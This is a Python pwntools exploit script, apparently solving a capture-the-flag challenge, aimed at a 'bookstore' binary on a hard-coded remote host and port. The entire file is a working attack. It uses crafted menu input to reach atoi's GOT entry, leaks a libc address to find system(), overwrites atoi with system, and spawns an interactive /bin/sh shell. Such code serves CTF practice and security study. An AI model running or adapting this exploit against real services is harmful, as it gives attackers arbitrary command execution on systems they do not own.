from pwn import *
context.log_level = 'debug'

TARGET = './bookstore'
HOST = '130.211.214.112'
PORT = 18012

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()
if args.D:
    debug(r, [0x265c, 0x2370, 0x278a])

def add(name, year):
    r.sendline('1')
    r.sendlineafter('book?', name)
    if year == 0:
        r.sendlineafter('published?', '')
    else:
        r.sendlineafter('published?', str(year))
    r.recvuntil('Choice : ')

def delelete(name, year, idx):
    r.sendline('2')
    r.sendlineafter('book?', name)
    r.sendlineafter('published?', str(year))
    r.sendlineafter('delete?', str(idx))
    r.recvuntil('Choice : ')

def edit(name, year, text):
    r.sendline('3')
    r.sendlineafter('book?', name)
    if year == 0:
        r.sendlineafter('published?', '\x00')
    else:
        r.sendlineafter('published?', str(year))
    r.sendafter('Description : ', text)
    r.recvuntil('Choice : ')

def show():
    r.sendline('4')
    return r.recvuntil('Choice : ')

r.recvuntil('Choice : ')

payload = '1 '+'1'*6
payload += p64(elf.got['atoi']-0x68).strip('\x00')
r.sendline(payload)

r.sendlineafter('book?', '')
r.sendlineafter('published?', '')

r.recvuntil('Choice : ')

payload = '1 '+'1'*6
payload += p64(elf.got['atoi']).strip('\x00')
r.sendline(payload)

r.sendlineafter('book?', '')
r.sendlineafter('published?', '')

r.recvuntil('Choice : ')
text = show()
fake_input1 = text.split('0 : ')[1][:2]
fake_input2 = text.split('\n     ')[1]

leak1 = u32(text.split('1 : ')[1][:2].ljust(4, '\x00'))
leak2 = int(text.split('\n     ')[3])
dbg("leak2")
print hex(leak1), hex(leak2), leak2
if leak2 < 0:
    leak = (leak1 << (8*4)) + ((leak2 * (-1)) ^ 0xffffffff) + 1
else:
    leak = (leak1 << (8*4)) + leak2

dbg("leak")
base = leak - 0x3b970
# base = leak - 0x26fdf0
dbg("base")
system = base + 0x47850


payload = '3 '+'1'*6
payload += p64(elf.got['atoi']-0x68).strip('\x00')
r.sendline(payload)

# r.sendlineafter('book?', p32(leak1)[:2])
# r.sendlineafter('published?', str(leak2))
r.sendlineafter('book?', fake_input1)
r.sendlineafter('published?', fake_input2)
r.sendafter('Description : ', p64(system))

r.sendafter('Choice : ', "/bin/sh")


r.interactive()
